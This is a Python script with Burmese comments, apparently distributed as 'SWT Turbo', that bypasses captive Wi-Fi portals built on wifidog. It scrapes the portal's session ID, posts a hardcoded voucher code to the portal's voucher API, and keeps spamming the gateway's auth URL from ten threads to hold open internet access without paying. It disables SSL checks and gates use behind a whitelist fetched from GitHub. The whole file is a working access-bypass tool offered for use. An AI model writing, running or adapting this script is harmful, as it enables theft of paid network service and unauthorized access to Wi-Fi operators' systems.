import requests
import re
import urllib3
import time
import threading
import os
import sys
import psutil
from urllib.parse import urlparse, parse_qs, urljoin

# SSL Warning များအား ပိတ်ထားရန်
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- CONFIGURATION ---
WHITELIST_URL = "https://raw.githubusercontent.com/winhtetaung1662004-byte/win/main/keys.txt"
PING_THREADS = 10
STOP_EVENT = threading.Event()  # Internet Access ကို ထိန်းချုပ်ရန်

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def show_banner():
    clear_screen()
    banner = """
    \033[1;32m
    ##########################################
    #                                        #
    #              SWT  TURBO                #
    #      [ VERIFIED ACCESS SYSTEM ]        #
    #                                        #
    ##########################################
    \033[0m
    """
    print(banner)

def check_approval_online():
    """Server ရှိ Whitelist နှင့် Device ID တိုက်စစ်ခြင်း"""
    try:
        # Termux သို့မဟုတ် Linux အခြေပြု Device ID ရယူခြင်း
        device_id = os.popen("id -u -n").read().strip()
        headers = {'Cache-Control': 'no-cache', 'Pragma': 'no-cache'}
        response = requests.get(WHITELIST_URL, headers=headers, timeout=10)
        
        allowed_users = response.text.splitlines()
        if device_id in allowed_users:
            return True, device_id
        else:
            return False, device_id
    except:
        return False, "Unknown"

def high_speed_ping(auth_link, session):
    """အင်တာနက် Access ကို တည်မြဲနေစေရန် Background မှ Ping ပို့ပေးခြင်း"""
    while not STOP_EVENT.is_set():
        try:
            session.get(auth_link, timeout=5)
        except:
            break
        time.sleep(0.1)

def start_process():
    show_banner()
    print("[*] Initializing Bypass for ID Verification...")
    
    session = requests.Session()
    test_url = "http://connectivitycheck.gstatic.com/generate_204"
    
    try:
        # ၁။ Portal Detection နှင့် Temporary Bypass (ID စစ်ရန် အင်တာနက်ခဏဖွင့်ခြင်း)
        r = requests.get(test_url, allow_redirects=True, timeout=5)
        
        if r.url != test_url:
            portal_url = r.url
            parsed_portal = urlparse(portal_url)
            r1 = session.get(portal_url, verify=False, timeout=10)
            path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
            next_url = urljoin(portal_url, path_match.group(1)) if path_match else portal_url
            r2 = session.get(next_url, verify=False, timeout=10)
            
            sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
            
            if sid:
                # Voucher ခဏ Activate လုပ်သည်
                portal_host = f"{parsed_portal.scheme}://{parsed_portal.netloc}"
                session.post(f"{portal_host}/api/auth/voucher/", 
                             json={'accessCode': '123456', 'sessionId': sid, 'apiVersion': 1}, timeout=5)
                
                gw_addr = parse_qs(parsed_portal.query).get('gw_address', ['192.168.60.1'])[0]
                gw_port = parse_qs(parsed_portal.query).get('gw_port', ['2060'])[0]
                auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}"
                
                # --- PHASE: VERIFICATION (ခေတ္တအင်တာနက်ပေး၍ ID စစ်ခြင်း) ---
                temp_stop = threading.Event()
                def temp_ping():
                    while not temp_stop.is_set():
                        try: session.get(auth_link, timeout=3)
                        except: break
                        time.sleep(0.5)
                
                t = threading.Thread(target=temp_ping, daemon=True)
                t.start()
                
                print("[*] Server နှင့် ချိတ်ဆက်နေပါသည်...")
                time.sleep(2) # အင်တာနက် တည်ငြိမ်ရန် စောင့်ခြင်း
                
                is_authorized, device_id = check_approval_online()
                
                # ID စစ်ပြီးတာနဲ့ အင်တာနက် Access ကို ချက်ချင်းပြန်ဖြတ်လိုက်သည်
                temp_stop.set()
                print("\033[1;31m[*] ID Verification Done. Connection Paused.\033[0m")
                
                if is_authorized:
                    print(f"\033[1;32m[+] ID {device_id} Verified!\033[0m")
                    print("\n\033[1;33m[1] Start SWT Turbo Internet (Permanent Access)")
                    print("[0] Exit\033[0m")
                    
                    choice = input("\nSelect Option: ")
                    if choice == '1':
                        show_banner()
                        print("[*] Activating Full Turbo Access...")
                        
                        # --- PHASE: PERMANENT ACCESS (User က 1 နှိပ်မှ အမြဲတမ်းဖွင့်ပေးခြင်း) ---
                        STOP_EVENT.clear() 
                        for _ in range(PING_THREADS):
                            threading.Thread(target=high_speed_ping, args=(auth_link, session), daemon=True).start()
                        
                        start_time = time.time()
                        while True:
                            elapsed = time.time() - start_time
                            h, m = divmod(int(elapsed // 60), 60); s = int(elapsed % 60)
                            print(f"\r\033[1;36m[*] Status: Online | Up: {h:02d}:{m:02d}:{s:02d} | ID: {device_id} (Approved)\033[0m", end='', flush=True)
                            time.sleep(5)
                    else:
                        print("Exiting...")
                        sys.exit()
                else:
                    print(f"\n\033[1;31m[!] Access Denied! Your ID ({device_id}) is not registered.\033[0m")
                    sys.exit()
            else:
                print("[!] SID မတွေ့ပါ။ Portal ချိတ်ဆက်မှုအား စစ်ဆေးပါ။")
        else:
            print("[!] အင်တာနက် ရရှိနေပြီးသား ဖြစ်သည်။")
            
    except Exception as e:
        print(f"[!] Critical Error: {e}")
        sys.exit()

if __name__ == "__main__":
    try:
        start_process()
    except KeyboardInterrupt:
        print("\n\nStopped by user.")
        sys.exit()

